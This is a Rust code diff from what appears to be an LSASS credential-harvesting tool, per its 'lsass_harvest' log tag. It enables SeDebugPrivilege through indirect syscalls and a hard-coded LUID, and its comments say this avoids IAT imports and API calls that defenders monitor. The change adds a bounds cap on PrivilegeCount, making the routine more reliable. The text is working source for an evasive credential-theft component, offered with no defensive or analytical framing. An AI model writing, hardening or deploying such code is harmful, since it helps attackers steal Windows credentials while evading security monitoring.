@@ -717,7 +717,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 /// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
 /// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
-    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
+    use winapi::um::winnt::{LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
 
     // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
     // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
@@ -788,11 +788,15 @@ fn enable_debug_privilege() -> Result<bool> {
         };
         if nt_success(status) {
             let tp = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const TOKEN_PRIVILEGES) };
-            let count = tp.PrivilegeCount;
+            let mut privilege_count = tp.PrivilegeCount as usize;
+            if privilege_count > 100 {
+                log::warn!("lsass_harvest: PrivilegeCount={} is suspiciously high, capping at 100", privilege_count);
+                privilege_count = 100;
+            }
             let entries = unsafe {
                 std::slice::from_raw_parts(
                     tp.Privileges.as_ptr(),
-                    count as usize,
+                    privilege_count.min((return_length as usize - std::mem::size_of::<u32>()) / std::mem::size_of::<LUID_AND_ATTRIBUTES>()),
                 )
             };
             entries.iter().any(|p| {
